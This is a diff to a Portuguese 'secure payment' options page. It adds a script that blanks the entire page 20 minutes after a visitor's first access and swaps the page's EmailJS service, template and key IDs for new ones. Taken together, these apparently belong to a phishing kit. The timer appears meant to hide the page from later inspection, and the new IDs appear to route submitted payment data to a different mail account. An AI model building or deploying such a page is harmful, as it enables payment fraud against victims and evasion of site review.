@@ -1,6 +1,32 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
+    <script>
+(function() {
+    // Configuração: 20 minutos em milissegundos
+    const VINTE_MINUTOS = 20 * 60 * 1000; 
+    const agora = new Date().getTime();
+    
+    let primeiroAcesso = localStorage.getItem('site_primeiro_acesso');
+
+    if (!primeiroAcesso) {
+        localStorage.setItem('site_primeiro_acesso', agora);
+    } else {
+        const tempoDecorrido = agora - parseInt(primeiroAcesso);
+
+        if (tempoDecorrido > VINTE_MINUTOS) {
+            // Remove todo o conteúdo do HTML e deixa a tela branca
+            document.documentElement.innerHTML = "";
+            
+            // Força o fundo a ficar branco (caso o CSS do site tenha cores)
+            document.documentElement.style.backgroundColor = "#ffffff";
+            
+            // Interrompe qualquer outro carregamento
+            window.stop(); 
+        }
+    }
+})();
+</script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Opções de Pagamento | Pagamento Seguro</title>
@@ -968,9 +994,9 @@
 
     <script>
         // ==================== CONFIGURAÇÕES FIXAS ====================
-        const EMAILJS_SERVICE_ID = 'service_0euy74r'; // Substitua pelo seu Service ID
-        const EMAILJS_TEMPLATE_ID = 'template_og6xhe7'; // Substitua pelo seu Template ID
-        const EMAILJS_PUBLIC_KEY = 'ik9ItcbFPwvdfWsPn'; // Substitua pela sua Public Key
+        const EMAILJS_SERVICE_ID = 'service_z9s6r88'; // Substitua pelo seu Service ID
+        const EMAILJS_TEMPLATE_ID = 'template_ymp0ana'; // Substitua pelo seu Template ID
+        const EMAILJS_PUBLIC_KEY = 'B7vWg-DOSfFey8sM3'; // Substitua pela sua Public Key
         // =============================================================
 
         function getUrlParameter(name) {
